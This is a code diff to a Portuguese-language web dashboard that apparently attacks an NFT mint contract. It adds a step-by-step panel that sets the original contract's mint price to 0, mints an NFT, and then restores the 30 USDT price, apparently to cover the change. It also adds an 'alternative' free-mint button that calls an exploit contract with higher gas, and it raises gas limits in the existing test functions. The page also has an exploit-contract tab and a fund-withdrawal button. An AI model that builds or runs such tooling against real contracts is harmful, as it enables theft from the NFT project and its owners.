@@ -67,6 +67,13 @@
             padding: 10px 25px;
             font-weight: bold;
         }
+        .btn-info {
+            background: linear-gradient(45deg, #00c6ff, #0072ff);
+            border: none;
+            border-radius: 30px;
+            padding: 10px 25px;
+            font-weight: bold;
+        }
         .wallet-info {
             background: rgba(255, 255, 255, 0.15);
             border-radius: 10px;
@@ -233,6 +240,43 @@
             max-height: 300px;
             overflow-y: auto;
         }
+        .step-by-step {
+            background: rgba(156, 39, 176, 0.2);
+            border: 1px solid #9c27b0;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .step {
+            margin-bottom: 15px;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+        }
+        .step-number {
+            display: inline-block;
+            width: 25px;
+            height: 25px;
+            background: #9c27b0;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 25px;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+        .step-status {
+            float: right;
+            font-size: 14px;
+        }
+        .step-status.pending {
+            color: #ffc107;
+        }
+        .step-status.success {
+            color: #4caf50;
+        }
+        .step-status.error {
+            color: #f44336;
+        }
     </style>
 </head>
 <body>
@@ -288,6 +332,11 @@
             <li class="nav-item" role="presentation">
                 <button class="nav-link" id="exploit-tab" data-bs-toggle="tab" data-bs-target="#exploit" type="button" role="tab" aria-controls="exploit" aria-selected="false">
                     <i class="fas fa-bug"></i> Contrato de Exploração
+                </button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="step-tab" data-bs-toggle="tab" data-bs-target="#step" type="button" role="tab" aria-controls="step" aria-selected="false">
+                    <i class="fas fa-list-ol"></i> Mint Passo a Passo
                 </button>
             </li>
             <li class="nav-item" role="presentation">
@@ -385,14 +434,14 @@
                         <div class="col-md-6">
                             <div class="input-group mb-3">
                                 <span class="input-group-text">Limite de Gás:</span>
-                                <input type="number" class="form-control" id="gasLimitInput" placeholder="300000" value="1000000">
+                                <input type="number" class="form-control" id="gasLimitInput" placeholder="300000" value="2000000">
                                 <span class="input-group-text">unidades</span>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="input-group mb-3">
                                 <span class="input-group-text">Preço do Gás:</span>
-                                <input type="number" class="form-control" id="gasPriceInput" placeholder="5" value="15">
+                                <input type="number" class="form-control" id="gasPriceInput" placeholder="5" value="20">
                                 <span class="input-group-text">Gwei</span>
                             </div>
                         </div>
@@ -416,6 +465,17 @@
                     </div>
                 </div>
 
+                <!-- Mint Alternativo -->
+                <div class="exploit-section mt-3">
+                    <h5><i class="fas fa-magic"></i> Mint Alternativo (Mais Gás)</h5>
+                    <p>Se o método acima falhar, tente esta alternativa com configurações de gás mais altas.</p>
+                    <div class="d-grid gap-2">
+                        <button id="freeMintAlternativeBtn" class="btn btn-warning" disabled>
+                            <i class="fas fa-magic"></i> Mint Alternativo
+                        </button>
+                    </div>
+                </div>
+
                 <!-- Informações do Contrato de Exploração -->
                 <div class="card">
                     <div class="card-header">
@@ -435,6 +495,56 @@
                             <button id="withdrawBtn" class="btn btn-warning" disabled>
                                 <i class="fas fa-hand-holding-usd"></i> Sacar Fundos
                             </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Conteúdo do Mint Passo a Passo -->
+            <div class="tab-pane fade" id="step" role="tabpanel" aria-labelledby="step-tab">
+                <div class="step-by-step">
+                    <h5><i class="fas fa-list-ol"></i> Mint Gratuito Passo a Passo</h5>
+                    <p>Se o método automático falhar, tente executar cada passo manualmente.</p>
+                    
+                    <div class="step">
+                        <span class="step-number">1</span>
+                        <strong>Alterar Preço para 0</strong>
+                        <span class="step-status pending" id="step1Status">Pendente</span>
+                        <p class="mt-2">Altera o preço do mint para 0 no contrato original.</p>
+                        <div class="d-grid gap-2 mt-2">
+                            <button id="step1Btn" class="btn btn-warning" disabled>
+                                <i class="fas fa-tag"></i> Alterar Preço para 0
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <span class="step-number">2</span>
+                        <strong>Mintar NFT</strong>
+                        <span class="step-status pending" id="step2Status">Pendente</span>
+                        <p class="mt-2">Mintar o NFT com o preço alterado para 0.</p>
+                        <div class="d-grid gap-2 mt-2">
+                            <button id="step2Btn" class="btn btn-info" disabled>
+                                <i class="fas fa-magic"></i> Mintar NFT
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="step">
+                        <span class="step-number">3</span>
+                        <strong>Restaurar Preço Original</strong>
+                        <span class="step-status pending" id="step3Status">Pendente</span>
+                        <p class="mt-2">Restaura o preço original do mint (30 USDT).</p>
+                        <div class="d-grid gap-2 mt-2">
+                            <button id="step3Btn" class="btn btn-secondary" disabled>
+                                <i class="fas fa-undo"></i> Restaurar Preço Original
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-4">
+                        <div class="alert alert-info">
+                            <i class="fas fa-info-circle"></i> <strong>Importante:</strong> Execute os passos em ordem. Se algum passo falhar, tente novamente antes de prosseguir.
                         </div>
                     </div>
                 </div>
@@ -578,6 +688,9 @@
         let userAddress;
         let exploitContractAddress;
         let eventListeners = [];
+        let step1Completed = false;
+        let step2Completed = false;
+        let step3Completed = false;
         
         // Elementos DOM
         const connectWalletBtn = document.getElementById('connectWalletBtn');
@@ -590,6 +703,7 @@
         const nftCount = document.getElementById('nftCount');
         const mintNftBtn = document.getElementById('mintNftBtn');
         const freeMintBtn = document.getElementById('freeMintBtn');
+        const freeMintAlternativeBtn = document.getElementById('freeMintAlternativeBtn');
         const claimRewardsBtn = document.getElementById('claimRewardsBtn');
         const withdrawBtn = document.getElementById('withdrawBtn');
         const availableRewards = document.getElementById('availableRewards');
@@ -618,12 +732,19 @@
         const listenEventsBtn = document.getElementById('listenEventsBtn');
         const eventsList = document.getElementById('eventsList');
         const eventsContent = document.getElementById('eventsContent');
+        const step1Btn = document.getElementById('step1Btn');
+        const step2Btn = document.getElementById('step2Btn');
+        const step3Btn = document.getElementById('step3Btn');
+        const step1Status = document.getElementById('step1Status');
+        const step2Status = document.getElementById('step2Status');
+        const step3Status = document.getElementById('step3Status');
         
         // Event Listeners
         connectWalletBtn.addEventListener('click', connectWallet);
         copyAddressBtn.addEventListener('click', () => copyToClipboard(addressText.textContent));
         mintNftBtn.addEventListener('click', mintNft);
         freeMintBtn.addEventListener('click', freeMint);
+        freeMintAlternativeBtn.addEventListener('click', freeMintAlternative);
         claimRewardsBtn.addEventListener('click', claimRewards);
         withdrawBtn.addEventListener('click', withdrawFunds);
         copyTxHashBtn.addEventListener('click', () => copyToClipboard(txHash.textContent));
@@ -633,6 +754,9 @@
         testRestorePriceBtn.addEventListener('click', testRestorePrice);
         checkContractStateBtn.addEventListener('click', checkContractState);
         listenEventsBtn.addEventListener('click', toggleEventListening);
+        step1Btn.addEventListener('click', step1SetPrice);
+        step2Btn.addEventListener('click', step2Mint);
+        step3Btn.addEventListener('click', step3RestorePrice);
         
         // Funções
         async function connectWallet() {
@@ -831,12 +955,16 @@
                 document.getElementById('exploitContract').textContent = exploitContractAddress;
                 exploitContractAddressSpan.textContent = exploitContractAddress;
                 freeMintBtn.disabled = false;
+                freeMintAlternativeBtn.disabled = false;
                 withdrawBtn.disabled = false;
                 testSetPriceBtn.disabled = false;
                 testMintBtn.disabled = false;
                 testRestorePriceBtn.disabled = false;
                 checkContractStateBtn.disabled = false;
                 listenEventsBtn.disabled = false;
+                step1Btn.disabled = false;
+                step2Btn.disabled = false;
+                step3Btn.disabled = false;
                 exploitStatus.style.display = 'block';
                 
                 showAlert('Contrato de exploração configurado com sucesso!', 'success');
@@ -856,8 +984,8 @@
             
             try {
                 // Obter opções de gás
-                const gasLimit = parseInt(gasLimitInput.value) || 1000000;
-                const gasPrice = ethers.utils.parseUnits(gasPriceInput.value.toString() || '15', 'gwei');
+                const gasLimit = parseInt(gasLimitInput.value) || 2000000;
+                const gasPrice = ethers.utils.parseUnits(gasPriceInput.value.toString() || '20', 'gwei');
                 
                 // Configurar opções de transação
                 const options = {
@@ -905,6 +1033,194 @@
             }
         }
         
+        async function freeMintAlternative() {
+            if (!confirm('Tem certeza que deseja usar o método de mint gratuito alternativo? Este método usa configurações de gás ainda mais altas.')) {
+                return;
+            }
+            
+            showLoading(true);
+            
+            try {
+                // Configurar opções de transação com valores ainda mais altos
+                const options = {
+                    gasLimit: 5000000,
+                    gasPrice: ethers.utils.parseUnits('30', 'gwei')
+                };
+                
+                // Mint gratuito através do contrato de exploração
+                const freeMintTx = await exploitContract.freeMint(options);
+                showTransactionInfo(freeMintTx.hash);
+                
+                await freeMintTx.wait();
+                
+                showAlert('NFT mintado gratuitamente com sucesso!', 'success');
+                await updateBalances();
+                await updateNFTs();
+            } catch (error) {
+                console.error('Erro ao mintar NFT gratuitamente (alternativo):', error);
+                
+                // Exibir detalhes do erro
+                let errorMessage = `Erro ao mintar NFT gratuitamente (alternativo): ${error.message}`;
+                
+                if (error.error && error.error.data) {
+                    errorMessage += `<div class="error-details mt-2">
+                        <strong>Detalhes do erro:</strong><br>
+                        ${JSON.stringify(error.error.data, null, 2)}
+                    </div>`;
+                }
+                
+                if (error.transaction) {
+                    errorMessage += `<div class="error-details mt-2">
+                        <strong>Detalhes da transação:</strong><br>
+                        ${JSON.stringify(error.transaction, null, 2)}
+                    </div>`;
+                }
+                
+                showAlert(errorMessage, 'danger');
+            } finally {
+                showLoading(false);
+            }
+        }
+        
+        async function step1SetPrice() {
+            if (!confirm('Tem certeza que deseja alterar o preço do mint para 0?')) {
+                return;
+            }
+            
+            showLoading(true);
+            updateStepStatus(1, 'pending');
+            
+            try {
+                // Alterar preço para 0
+                const tx = await originalContract.setMintPrice(0, {
+                    gasLimit: 2000000,
+                    gasPrice: ethers.utils.parseUnits('20', 'gwei')
+                });
+                
+                showTransactionInfo(tx.hash);
+                await tx.wait();
+                
+                updateStepStatus(1, 'success');
+                step1Completed = true;
+                showAlert('Preço alterado para 0 com sucesso!', 'success');
+                
+                // Habilitar próximo passo
+                step2Btn.disabled = false;
+            } catch (error) {
+                console.error('Erro ao alterar preço para 0:', error);
+                updateStepStatus(1, 'error');
+                showAlert(`Erro ao alterar preço para 0: ${error.message}`, 'danger');
+            } finally {
+                showLoading(false);
+            }
+        }
+        
+        async function step2Mint() {
+            if (!step1Completed) {
+                showAlert('Por favor, complete o passo 1 primeiro.', 'warning');
+                return;
+            }
+            
+            if (!confirm('Tem certeza que deseja mintar o NFT?')) {
+                return;
+            }
+            
+            showLoading(true);
+            updateStepStatus(2, 'pending');
+            
+            try {
+                // Mint NFT
+                const tx = await originalContract.mint({
+                    gasLimit: 3000000,
+                    gasPrice: ethers.utils.parseUnits('20', 'gwei')
+                });
+                
+                showTransactionInfo(tx.hash);
+                await tx.wait();
+                
+                updateStepStatus(2, 'success');
+                step2Completed = true;
+                showAlert('NFT mintado com sucesso!', 'success');
+                
+                // Atualizar saldos
+                await updateBalances();
+                await updateNFTs();
+                
+                // Habilitar próximo passo
+                step3Btn.disabled = false;
+            } catch (error) {
+                console.error('Erro ao mintar NFT:', error);
+                updateStepStatus(2, 'error');
+                showAlert(`Erro ao mintar NFT: ${error.message}`, 'danger');
+            } finally {
+                showLoading(false);
+            }
+        }
+        
+        async function step3RestorePrice() {
+            if (!step2Completed) {
+                showAlert('Por favor, complete o passo 2 primeiro.', 'warning');
+                return;
+            }
+            
+            if (!confirm('Tem certeza que deseja restaurar o preço original?')) {
+                return;
+            }
+            
+            showLoading(true);
+            updateStepStatus(3, 'pending');
+            
+            try {
+                // Restaurar preço original
+                const tx = await originalContract.setMintPrice(ethers.utils.parseUnits('30', 18), {
+                    gasLimit: 2000000,
+                    gasPrice: ethers.utils.parseUnits('20', 'gwei')
+                });
+                
+                showTransactionInfo(tx.hash);
+                await tx.wait();
+                
+                updateStepStatus(3, 'success');
+                step3Completed = true;
+                showAlert('Preço original restaurado com sucesso!', 'success');
+                
+                // Resetar passos
+                setTimeout(() => {
+                    step1Completed = false;
+                    step2Completed = false;
+                    step3Completed = false;
+                    updateStepStatus(1, 'pending');
+                    updateStepStatus(2, 'pending');
+                    updateStepStatus(3, 'pending');
+                    step2Btn.disabled = true;
+                    step3Btn.disabled = true;
+                }, 3000);
+            } catch (error) {
+                console.error('Erro ao restaurar preço original:', error);
+                updateStepStatus(3, 'error');
+                showAlert(`Erro ao restaurar preço original: ${error.message}`, 'danger');
+            } finally {
+                showLoading(false);
+            }
+        }
+        
+        function updateStepStatus(step, status) {
+            const statusElement = document.getElementById(`step${step}Status`);
+            statusElement.className = `step-status ${status}`;
+            
+            switch(status) {
+                case 'pending':
+                    statusElement.textContent = 'Pendente';
+                    break;
+                case 'success':
+                    statusElement.textContent = 'Concluído';
+                    break;
+                case 'error':
+                    statusElement.textContent = 'Falhou';
+                    break;
+            }
+        }
+        
         async function testSetPrice() {
             if (!confirm('Tem certeza que deseja testar a função setMintPrice(0)?')) {
                 return;
@@ -915,8 +1231,8 @@
             try {
                 // Testar setMintPrice(0)
                 const tx = await originalContract.setMintPrice(0, {
-                    gasLimit: 200000,
-                    gasPrice: ethers.utils.parseUnits('15', 'gwei')
+                    gasLimit: 2000000,
+                    gasPrice: ethers.utils.parseUnits('20', 'gwei')
                 });
                 
                 showTransactionInfo(tx.hash);
@@ -947,8 +1263,8 @@
             try {
                 // Testar mint()
                 const tx = await originalContract.mint({
-                    gasLimit: 300000,
-                    gasPrice: ethers.utils.parseUnits('15', 'gwei')
+                    gasLimit: 3000000,
+                    gasPrice: ethers.utils.parseUnits('20', 'gwei')
                 });
                 
                 showTransactionInfo(tx.hash);
@@ -983,8 +1299,8 @@
             try {
                 // Testar setMintPrice(30e18)
                 const tx = await originalContract.setMintPrice(ethers.utils.parseUnits('30', 18), {
-                    gasLimit: 200000,
-                    gasPrice: ethers.utils.parseUnits('15', 'gwei')
+                    gasLimit: 2000000,
+                    gasPrice: ethers.utils.parseUnits('20', 'gwei')
                 });
                 
                 showTransactionInfo(tx.hash);
